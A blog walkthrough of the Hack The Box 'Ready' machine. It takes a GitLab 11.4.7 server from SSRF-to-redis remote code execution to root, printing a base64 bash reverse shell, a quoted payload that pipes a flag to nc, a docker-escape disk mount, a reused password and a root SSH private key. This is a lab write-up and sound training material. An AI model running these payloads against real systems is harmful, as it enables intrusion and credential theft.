12 2020 .selected_editor drwx------ 2 root root 4096 Dec 7 16:49 .ssh drwxr-xr-x 2 root root 4096 Dec 1 12:28 .vim lrwxrwxrwx 1 root root 9 Dec 7 17:02 .viminfo -&gt; /dev/null drwxr-xr-x 3 root root 4096 Dec 1 12:41 docker-gitlab drwxr-xr-x 10 root root 4096 Jul 9 2020 ready-channel -r-------- 1 root root 33 Jul 8 2020 root.txt drwxr-xr-x 3 root root 4096 May 18 2020 snap To get a root shell, we can download the root ssh key to our machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 root@gitlab:~# cat /mnt/lol/root/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn 6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011 YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+ lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2 3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8 kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1 KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd -----END RSA PRIVATE KEY----- Now we can ssh into the target as root. 1 2 3 4 5 6 7 8 $ xclip -sel clip -o &gt; root $ chmod 600 root $ ssh -i root root@10.10.10.220 ... root@ready:~# whoami root","@type":"BlogPosting","headline":"HTB - Ready","dateModified":"2021-05-16T00:00:00+10:00","datePublished":"2021-05-16T00:00:00+10:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://qtranspose.xyz/posts/htb-ready/"},"author":{"@type":"Person","name":"QTranspose"},"url":"https://qtranspose.xyz/posts/htb-ready/","@context":"https://schema.org"}</script><title>HTB - Ready | QTranspose</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/qtranspose.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">QTranspose</a></div><div class="site-subtitle font-italic">Rock The Matrix</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/QTranspose" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://app.hackthebox.eu/profile/112476" aria-label="hackthebox" class="order-4" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HTB - Ready</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB - Ready</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, May 16, 2021, 12:00 AM +1000" > May 16 <i class="unloaded">2021-05-16T00:00:00+10:00</i> </span> by <span class="author"> QTranspose </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1137 words">6 min</span></div></div><div class="post-content"><p>Ready is a vulnerable virtual machine created by bertolis on HackTheBox. In this post, we document a complete walkthrough of pwning this machine.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap">Nmap</h3><p>Starting off with the <code class="language-plaintext highlighter-rouge">nmap</code> scan, we see that this is a Linux machine running <code class="language-plaintext highlighter-rouge">SSH</code> and <code class="language-plaintext highlighter-rouge">HTTP</code> services.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>$ nmap-default 10.10.10.220

Nmap scan report for 10.10.10.220
Host is up (0.031s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>The version of the system can be identified by searching for the <code class="language-plaintext highlighter-rouge">OpenSSH</code> package information. It appears to be <code class="language-plaintext highlighter-rouge">Ubuntu 20.04 (Focal Fossa)</code> according to the page below.</p><p><a href="https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4">https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4</a></p><p>For the details of the custom <code class="language-plaintext highlighter-rouge">nmap</code> commands, check <a href="/posts/workflow-improvement-with-simple-bash-scripts/">here</a>.</p><h3 id="http">HTTP</h3><p>A GitLab login page is found as the index page of the HTTP server, which is shown below.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-ready/http.jpg" alt="" /></p><p>As registration is turned on, an account can be registered to get access to it. After logging in, the version number can be found on the <code class="language-plaintext highlighter-rouge">help</code> page, which is <code class="language-plaintext highlighter-rouge">11.4.7</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-ready/help.jpg" alt="" /></p><h2 id="exploitation">Exploitation</h2><h3 id="gitlab-ssrf-to-rce">GitLab SSRF to RCE</h3><p>A <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">blog post</a> by <em>LiveOverflow</em> is found interesting, which describes how to leverage an SSRF vulnerability in <code class="language-plaintext highlighter-rouge">GitLab 11.4.7</code> to achieve RCE via <code class="language-plaintext highlighter-rouge">redis</code>. It involves using <em>IPv6/IPv4 Address Embedding</em> to bypass local address checks and <em>CRLF injection</em> to create new lines to be able to execute command in redis.</p><p>To do the exploitation, we first need to create a reverse shell payload. It is encoded in <code class="language-plaintext highlighter-rouge">base64</code> to avoid any bad characters since everything is sent in the URL.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ echo "bash -c 'bash -i  &gt;&amp; /dev/tcp/10.10.14.75/4444 0&gt;&amp;1'" | base64
YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo=
</pre></table></code></div></div><p>The reverse shell payload will be:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ echo YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo= | base64 -d | bash
</pre></table></code></div></div><p>Next, we copy the exploit payload in the blog post.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| cat /flag | nc 192.168.178.21 1234\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
</pre></table></code></div></div><p>We replace the command execution part with our reverse shell payload, and it reads as the following.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| echo YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzUvNDQ0NCAwPiYxJwo= | base64 -d | bash \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
</pre></table></code></div></div><p>Now that the payload is ready, we will create a new project and choose <em>import project from URL</em>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-ready/project1.jpg" alt="" /></p><p>We use <code class="language-plaintext highlighter-rouge">burp</code> to intercept the request, and modify it to include our payload as the following.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/posts/htb-ready/project2.jpg" alt="" /></p><p>Before sending the request, we will want to set up our <code class="language-plaintext highlighter-rouge">ncat</code> listener so that we can catch the reverse shell.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ ncat -nlvp 4444

...

git@gitlab:~/gitlab-rails/working$ whoami
git
</pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation</h2><p>After running <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a>, we know that we are in a docker environment. Also, an interesting directory <code class="language-plaintext highlighter-rouge">/opt/backup</code> has been found by the script. In the directory we find three files as below.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>git@gitlab:~/gitlab-rails/working$ cd /opt/backup
git@gitlab:/opt/backup$ ls -l
total 100
-rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
-rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
-rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb
</pre></table></code></div></div><p>In <code class="language-plaintext highlighter-rouge">docker-compose.yml</code>, we find that the container is running in <code class="language-plaintext highlighter-rouge">privileged</code> mode, which means that it has <code class="language-plaintext highlighter-rouge">root</code> access to all devices on the host system.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>git@gitlab:/opt/backup$ cat docker-compose.yml 

...

    privileged: true
</pre></table></code></div></div><p>And previously LinPEAS has shown the disks of the host system.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>[+] Any sd*/disk* disk in /dev? (limit 20)
sda                     
sda1                   
sda2              
sda3
</pre></table></code></div></div><p>But before we can abuse this, we need to pwn <code class="language-plaintext highlighter-rouge">root</code> inside the docker container. Fortunately, trying a password reuse with what we find in the same directory is successful, and that’s it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>git@gitlab:/opt/backup$ grep -R pass .

...

./gitlab.rb:gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"

git@gitlab:/opt/backup$ su - 
Password: 
root@gitlab:~# whoami
root
</pre></table></code></div></div><p>In the results of the <code class="language-plaintext highlighter-rouge">mount</code> command, we find something interesting. It indicates that <code class="language-plaintext highlighter-rouge">/dev/sda2</code> may be the host file system.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>root@gitlab:~# mount

...

/dev/sda2 on /root_pass type ext4 (rw,relatime)
/dev/sda2 on /etc/gitlab type ext4 (rw,relatime)
/dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime)
/dev/sda2 on /etc/hostname type ext4 (rw,relatime)
/dev/sda2 on /etc/hosts type ext4 (rw,relatime)
</pre></table></code></div></div><p>We can mount <code class="language-plaintext highlighter-rouge">/dev/sda2</code> to verify it. By doing that, we have found the <code class="language-plaintext highlighter-rouge">root.txt</code> we want.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>root@gitlab:~# mkdir -p /mnt/lol
root@gitlab:~# mount /dev/sda2 /mnt/lol
root@gitlab:~# ls /mnt/lol
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
root@gitlab:~# ls -la /mnt/lol/root
total 60
drwx------ 10 root root 4096 Dec  7 17:02 .
drwxr-xr-x 20 root root 4096 Dec  7 17:44 ..
lrwxrwxrwx  1 root root    9 Jul 11  2020 .bash_history -&gt; /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 May  7  2020 .cache
drwx------  3 root root 4096 Jul 11  2020 .config
-rw-r--r--  1 root root   44 Jul  8  2020 .gitconfig
drwxr-xr-x  3 root root 4096 May  7  2020 .local
lrwxrwxrwx  1 root root    9 Dec  7 17:02 .mysql_history -&gt; /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   75 Jul 12  2020 .selected_editor
drwx------  2 root root 4096 Dec  7 16:49 .ssh
drwxr-xr-x  2 root root 4096 Dec  1 12:28 .vim
lrwxrwxrwx  1 root root    9 Dec  7 17:02 .viminfo -&gt; /dev/null
drwxr-xr-x  3 root root 4096 Dec  1 12:41 docker-gitlab
drwxr-xr-x 10 root root 4096 Jul  9  2020 ready-channel
-r--------  1 root root   33 Jul  8  2020 root.txt
drwxr-xr-x  3 root root 4096 May 18  2020 snap
</pre></table></code></div></div><p>To get a <code class="language-plaintext highlighter-rouge">root</code> shell, we can download the root ssh key to our machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>root@gitlab:~# cat /mnt/lol/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
</pre></table></code></div></div><p>Now we can <code class="language-plaintext highlighter-rouge">ssh</code> into the target as <code class="language-plaintext highlighter-rouge">root</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>$ xclip -sel clip -o &gt; root
$ chmod 600 root
$ ssh -i root root@10.10.10.220

...

root@ready:~# whoami
root
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-write-ups/'>CTF Write-ups</a>, <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/gitlab/" class="post-tag no-text-decoration" >GitLab</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >SSRF</a> <a href="/tags/redis/" class="post-tag no-text-decoration" >Redis</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >Docker</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a 